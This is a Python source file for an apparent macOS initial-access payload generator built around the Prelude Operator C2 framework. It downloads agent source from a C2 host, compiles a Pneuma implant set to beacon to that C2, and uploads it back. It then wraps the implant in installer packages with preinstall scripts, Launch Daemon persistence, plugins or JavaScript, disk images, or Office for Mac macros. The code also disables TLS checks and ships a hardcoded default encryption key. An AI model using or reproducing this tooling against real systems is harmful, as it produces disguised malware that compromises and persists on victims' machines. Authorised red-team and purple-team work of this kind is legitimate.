from pick import pick
import yaml
import psutil
import logging
import shutil
import hashlib
import subprocess
import json
import zipfile
import platform
import os
import sys
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


logger = logging.getLogger(__name__)


def prereqs_present():
    if platform.system() != "Darwin":
        logger.error("This tool is only supported on macOS.")
        return False
    if not is_installed("go"):
        logger.error("Install golang for macOS.")
        return False
    if not is_installed("xcodebuild"):
        logger.error("Install xcode via the app store.")
        return False
    if not is_running("Operator"):
        logger.error("Prelude Operator needs to be running.")
        return False
    return True


def get_portal_settings():
    settings_file = '{}/Library/Application Support/Operator/portal.prelude.org/settings.yml'.format(
        os.path.expanduser('~'))

    with open(settings_file, "r") as stream:
        try:
            portal_settings = yaml.safe_load(stream)
        except yaml.YAMLError as exc:
            logger.error(exc)
            logger.error("[!] You will need to start Operator first.")
            sys.exit()

    return portal_settings


def get_redirectors():
    portal_settings = get_portal_settings()

    all_redirectors = []
    tmp_redirector = {}
    tmp_redirector['name'] = "localhost"
    tmp_redirector['host'] = '127.0.0.1'
    tmp_redirector['password'] = portal_settings['public']['token']
    all_redirectors.append(tmp_redirector)

    redirectors = portal_settings['private']['redirectors']
    for redirector in redirectors.keys():
        tmp_redirector = {}
        tmp_redirector['name'] = redirector
        tmp_redirector['host'] = redirectors[redirector]['host']
        tmp_redirector['password'] = redirectors[redirector]['password']
        all_redirectors.append(tmp_redirector)

    return all_redirectors


def get_agents():
    agent_path = os.path.join(os.getcwd(), 'src/agents.json')
    with open(agent_path, 'r') as fh:
        data = json.load(fh)
    return data


def get_logger(args):
    if args.debug:
        logging.basicConfig(
            format="%(asctime)-15s %(funcName)15s %(levelname)9s: %(message)s",
            level=logging.DEBUG
        )

    return logging.getLogger(__name__)


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--debug', action='store_true',
                        help='for debugging only')
    parser.add_argument(
        '--ip', type=str, help='Provide IP of redirector', default="0.0.0.0")

    return parser


def is_installed(program):
    rc = subprocess.call(['which', program], stdout=open(os.devnull, 'wb'))
    if rc == 0:
        return True
    else:
        logger.error("Dependecy not installed: {}".format(program))
        return False


def is_running(program):
    return program in (p.name() for p in psutil.process_iter())


def get_options():
    redirectors = get_redirectors()
    agents = get_agents()

    data = {
        'c2_name': 'operator',
        'agent': str,
        'agent-type': str,
        'outpost-filename': str,
        'supported-executables': list,
        'payload-type': str,
        'technique': str,
        'procedure': str,
        'needs-compilation': bool
    }

    title = 'Choose your payload:'
    options = []
    for agent in agents.keys():
        options.append(agent)
    data['agent'], _ = pick(options, title)

    options = agents[data['agent']]['supported_executables']
    data['agent-type'], _ = pick(options, title)

    data['outpost-filename'] = agents[data['agent']]['outpost_filename']
    data['needs-compilation'] = agents[data['agent']]['needs-compilation']

    title = 'IMPORTANT: if choosing a redirector, you need to first launch Operator and connect to it before proceeding!\nIMPORTANT: if choosing localhost, you\'ll need to disconnect from the redirector!\n\nChoose Redirector or localhost:'
    options = redirectors
    data['redirectors'], index = pick(options, title)

    encryption_key = input(
        "Enter encryption key (defaults to 'abcdefghijklmnopqrstuvwxyz012345' if left blank) > ")
    if not encryption_key:
        encryption_key = "abcdefghijklmnopqrstuvwxyz012345"
    data['redirectors']['encryption_key'] = encryption_key

    title = 'Choose your initial access vector:'
    options = [
        'Installer Packages',
        'Disk Image',
        'Office for Mac'
    ]
    data['technique'], index = pick(options, title)
    if data['technique'] == 'Disk Image':
        data['procedure'] = data['technique']

    if data['technique'] == "Installer Packages":
        title = 'Choose your Installer Package option:'
        options = [
            'Installer Package w/ only preinstall script',
            'Installer Package w/ Launch Daemon for Persistence',
            'Installer Package w/ Installer Plugin',
            'Installer Package w/ JavaScript Functionality embedded',
            'Installer Package w/ JavaScript Functionality in Script',
        ]
        data['procedure'], index = pick(options, title)
    elif data['technique'] == 'Office for Mac':
        title = 'Choose your Office for Mac procedure:'
        options = [
            'Macro VBA Excel',
            'Macro VBA PowerPoint',
            'Macro VBA Word',
            'Macro SYLK Excel'
        ]
        data['procedure'], index = pick(options, title)

    return data


class C2:

    def __init__(self, all_options):

        self.c2_name = all_options['c2_name']
        self.agent = all_options['agent']
        self.outpost_filename = all_options['outpost-filename']
        self.c2_comm_ip = all_options['redirectors']['host']
        self.token = all_options['redirectors']['password']
        self.session = requests.Session()
        self.outpost_url = 'https://professional.outposts-lateralus.prelude.org/ping?extended=1'
        self.payloads_url = 'http://{}:3391/payloads'.format(self.c2_comm_ip)
        self.appdir = os.getcwd()
        self.payloads_dir = 'Payloads'
        self.full_payloads_dir = os.path.join(self.appdir,
                                              self.payloads_dir)
        self.payload_staging_dir = os.path.join(self.payloads_dir, 'tmp')
        self.full_payload_staging_dir = os.path.join(self.appdir,
                                                     self.payload_staging_dir)
        self.full_downloaded_payload_file = None
        self.downloaded_payload_file = None
        self.full_payload_remote_location = None
        self.payload_remote_location = None

    def rest_call(self, method, url, data=''):
        if method == 'GET':
            return self.session.get(url)
        elif method == 'PUT':
            filename = data.split('/')[-1]
            return self.session.put(url, files=[("upload", (filename, open(data, "rb"), "application/octet-stream"))], verify=False, headers={'Authorization': self.token})

    def get_payload_remote_location(self):
        logger.debug(
            "Getting payload remote location: {}".format(self.outpost_url))
        if self.c2_name == 'operator':
            r_json = self.rest_call('GET', self.outpost_url).json()
            for payload in r_json['payloads']:
                if payload.endswith(self.outpost_filename):
                    self.payload_remote_location = payload
                    break

        self.full_payload_remote_location = os.path.join(
            self.payloads_url, self.payload_remote_location)
        logger.debug("Set variable: {}".format(
            self.full_payload_remote_location))
        self.downloaded_payload_file = self.payload_remote_location.split(
            '/')[-1]
        logger.debug("Set variable: {}".format(
            self.downloaded_payload_file))
        self.full_downloaded_payload_file = os.path.join(
            self.full_payloads_dir, self.downloaded_payload_file)
        logger.debug("Set variable: {}".format(
            self.full_downloaded_payload_file))

    def get_payload(self):
        self.get_payload_remote_location()
        if self.c2_name == 'operator':
            print("Downloading payload.")
            logger.debug("Downloading payload: {}".format(
                self.full_payload_remote_location))
            r = self.rest_call('GET', self.full_payload_remote_location)
            open(os.path.join(self.payloads_dir,
                 self.downloaded_payload_file), 'wb').write(r.content)

    def extract_zip(self):
        extract_dir = os.path.join(self.full_payloads_dir, 'tmp')
        logger.debug("Extracting zip '{}' to '{}'".format(
            self.full_downloaded_payload_file, extract_dir))
        with zipfile.ZipFile(self.full_downloaded_payload_file, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)


class Agent:
    def __init__(self, c2, all_options):
        self.payload_destination = os.path.join(
            c2.full_payloads_dir, 'operator-payload')
        self.agent = all_options['agent']
        self.c2_comm_ip = all_options['redirectors']['host']
        self.c2_comm_port = '2323'
        self.token = all_options['redirectors']['password']
        self.encryption_key = all_options['redirectors']['encryption_key']
        self.full_build_script_path = None
        self.settings = None
        self.full_agent_profile_settings_file = None
        self.payload_hosting_url = None
        self.c2 = c2
        self.agent_src_path = c2.full_payload_staging_dir
        self.set_settings_file_path()

    def set_settings_file_path(self):
        if self.c2.c2_name == 'operator':
            self.full_agent_profile_settings_file = os.path.join(
                self.agent_src_path, 'util/conf/default.json')

    def build_operator_agent_config(self):
        logger.debug("Building agent config.")
        settings = {
            'AESKey': self.encryption_key,
            'Range': 'purple-team',
            'Contact': 'tcp',
            'Address': '{}:{}'.format(self.c2_comm_ip, self.c2_comm_port),
            'Useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
            'Sleep': 5,
            'KillSleep': 5,
            'CommandJitter': 1,
            'CommandTimeout': 60,
            'Proxy': '',
            'Debug': False,
        }
        logger.debug("Agent config: {}".format(settings))
        self.settings = settings

    def save_c2_profile_settings(self):
        logger.debug("Saving agent config to disk")
        with open(self.full_agent_profile_settings_file, 'w') as fh:
            json.dump(self.settings, fh, indent=2)

    def patch_agent(self, filepath, searchstring, content, action):
        # action can be append or replace
        with open(filepath, 'r') as fh:
            contents = fh.read()
            if action == 'replace':
                contents = contents.replace(searchstring, content)
            elif action == 'append':
                content = searchstring + content
                contents = contents.replace(searchstring, content)

        with open(filepath, 'w') as fh:
            fh.write(contents)
        logger.debug("Patched agent file: {}".format(filepath))
        logger.debug("with content: {}".format(content))

    def build_agent(self, all_options):
        my_env = os.environ.copy()
        my_env['GOOS'] = 'darwin'
        os.chdir(self.c2.payload_staging_dir)

        # current workaround to https://github.com/preludeorg/pneuma/pull/115
        self.patch_agent('util/config.go', '	"crypto/md5"\n',
                         '	"path/filepath"\n', 'append')
        self.patch_agent('util/config.go', '	executable, _ := os.Executable()\n',
                         '	_ = os.Chdir(filepath.Dir(executable))\n', 'append')

        cmds = []
        if all_options['agent'] == 'PneumaEX' and all_options['agent-type'] == 'exe':
            cmd = [
                'go',
                'build',
                '-ldflags="-s -w -buildid= -X main.randomHash=${1}"',
                '-o',
                'payloads/operator-payload',
                'main.go',
            ]
            cmds.append(cmd)

        for cmd in cmds:
            logger.debug("Building agent (this may take a while).")
            print("Building agent (this may take a while).")
            subprocess.call(cmd, env=my_env, stdout=open(os.devnull, 'wb'))
            logger.debug("Done building agent.")

        self.move_files(os.path.join(self.agent_src_path, 'payloads/operator-payload'),
                        os.path.join(self.c2.full_payloads_dir, 'operator-payload'))
        os.chdir(self.c2.appdir)

    def move_files(self, src, dst):
        os.rename(src, dst)
        logger.debug("Moved file to {}".format(dst))

    def upload_payload(self):
        filename = self.payload_destination.split('/')[-1]
        url = 'https://{}:8888/v1/payload'.format(self.c2.c2_comm_ip)
        logger.debug("Uploading payload '{}' to {}".format(filename, url))
        print("Uploading agent/payload.")
        r = self.c2.rest_call(
            'PUT', url, self.payload_destination)
        if r.status_code == 200:
            logger.debug("Uploaded file successfully: {}".format(filename))
            print("Done.")
            self.set_payload_remote_url()
        else:
            logger.error("Upload of file failed: {}".format(filename))
            logger.error(r.reason)

    def set_payload_remote_url(self):
        payload_hosting_port = '3391'
        sha1_hash = self.get_hash_of_file(self.payload_destination)
        self.payload_hosting_url = 'http://{}:{}/payloads/{}/{}'.format(
            self.c2.c2_comm_ip, payload_hosting_port, sha1_hash, self.payload_destination.split('/')[-1])

    def get_hash_of_file(self, filename):
        sha1_hash = hashlib.sha1()
        with open(filename, "rb") as f:
            # Read and update hash string value in blocks of 4K
            for byte_block in iter(lambda: f.read(4096), b""):
                sha1_hash.update(byte_block)
        return sha1_hash.hexdigest()


class ModuleGenerator:
    def __init__(self, agent):
        self.scripts_dir = None
        self.agent = agent

        self.module_root_path = os.path.join(
            os.getcwd(), "Payloads/tmp/ModuleGenerator")
        logger.debug("ModuleGenerator class created. Root Path set to: {}".format(
            self.module_root_path))

    def set_scripts_dir(self, dst):
        self.scripts_dir = os.path.join(self.module_root_path, dst)
        logger.debug("Set scripts dir to: {}".format(self.scripts_dir))

    def create_dir(self, dst):
        path = os.path.join(self.module_root_path, dst)
        os.makedirs(path, exist_ok=True)
        logger.debug("Made directory: {}".format(path))

    def create_file(self, dst, content):
        path = os.path.join(self.module_root_path, dst)
        with open(path, 'w') as fh:
            if isinstance(content, list):
                for line in content:
                    fh.write("%s\n" % line)
            elif isinstance(content, str):
                fh.write(content)
        logger.debug("Created file: {}".format(path))

    def make_executable(self, dst):
        path = os.path.join(self.module_root_path, dst)
        os.chmod(path, 0o755)
        logger.debug("Made file executable: {}".format(path))

    def run_pkgbuild(self, identifier, output, has_scripts):
        if has_scripts:
            cmd = [
                'pkgbuild',
                '--identifier',
                identifier,
                '--nopayload',
                '--scripts',
                self.scripts_dir,
                os.path.join(self.agent.c2.full_payloads_dir, output)
            ]
        else:
            cmd = [
                'pkgbuild',
                '--identifier',
                identifier,
                '--nopayload',
                os.path.join(self.agent.c2.full_payloads_dir, output)
            ]
        subprocess.call(cmd, stdout=open(os.devnull, 'wb'))

    def generate_payload(self, type, identifier, output, has_scripts=True):
        if type == 'pkgbuild':
            self.run_pkgbuild(identifier, output, has_scripts)
        elif type == 'productbuild-plugin':
            self.run_productbuild(type, identifier, output)
        elif type == 'productbuild-js':
            self.run_productbuild(type, identifier, output)
        elif type == 'productbuild-js-script':
            self.run_productbuild(type, identifier, output)

    def move_files(self, src, dst):
        dst_path = os.path.join(self.module_root_path, dst)
        os.rename(src, dst_path)
        logger.debug("Moved file to {}".format(dst_path))

    def generate_cleanup(self, instructions):
        print("\n[*] Removal Instructions:")
        for instruction in instructions:
            print("\t{}".format(instruction))

    def clean_payload_staging(self):
        logger.debug("Deleting directory {}".format(
            self.agent.c2.payload_staging_dir))
        shutil.rmtree(self.agent.c2.full_payload_staging_dir)
        files = [
            'pneumaEX.zip'
        ]
        for file in files:
            full_path = os.path.join(self.agent.c2.full_payloads_dir, file)
            if os.path.exists(full_path):
                os.remove(full_path)
                logger.debug("Deleting file: {}".format(full_path))

    def copy_filedir(self, src, dst):
        if os.path.isfile(src):
            shutil.copyfile(src, dst)
        else:
            try:
                shutil.copytree(src, dst)
                logger.debug("Copied Template Folder to '{}'".format(dst))
            except OSError:
                shutil.rmtree(dst)
                shutil.copytree(src, dst)
                logger.debug("Overwrote files '{}'".format(dst))

    def update_template(self, src_string, dst_string, filepath):

        with open(os.path.join(self.module_root_path, filepath), 'r') as fh:
            contents = fh.read()
            contents = contents.replace(src_string, dst_string)
        with open(os.path.join(self.module_root_path, filepath), 'w') as fh:
            fh.write(contents)
        logger.debug("Updated file: {}".format(filepath))
        logger.debug("with contents: {}".format(contents))

    def run_xcodebuild(self):
        cmd = [
            'xcodebuild',
            '-project',
            os.path.join(self.module_root_path, 'SpecialDelivery.xcodeproj')
        ]
        subprocess.call(cmd, stdout=open(os.devnull, 'wb'))

    def run_productbuild(self, type, identifier, output):
        if type == 'productbuild-plugin':
            cmd = [
                'productbuild',
                '--identifier',
                identifier,
                '--version',
                '1',
                '--package',
                os.path.join(self.module_root_path, 'plugins', output),
                '--plugins',
                os.path.join(self.module_root_path, 'plugins'),
                os.path.join(self.agent.c2.full_payloads_dir, output)
            ]
        elif type == 'productbuild-js':
            cmd = [
                'productbuild',
                '--distribution',
                os.path.join(self.module_root_path, 'distribution.xml'),
                '--package-path',
                os.path.join(self.agent.c2.full_payloads_dir, 'install.pkg'),
                os.path.join(self.agent.c2.full_payloads_dir, output)
            ]
        elif type == 'productbuild-js-script':
            cmd = [
                'productbuild',
                '--distribution',
                os.path.join(self.module_root_path, 'distribution.xml'),
                '--scripts',
                self.scripts_dir,
                '--package-path',
                os.path.join(self.agent.c2.full_payloads_dir, 'install.pkg'),
                os.path.join(self.agent.c2.full_payloads_dir, output)
            ]
        subprocess.call(cmd, stdout=open(os.devnull, 'wb'))

    def generate_instructions(self, instructions):
        print("\n[*] Instructions for payload:")
        for instruction in instructions:
            print("\t{}".format(instruction))
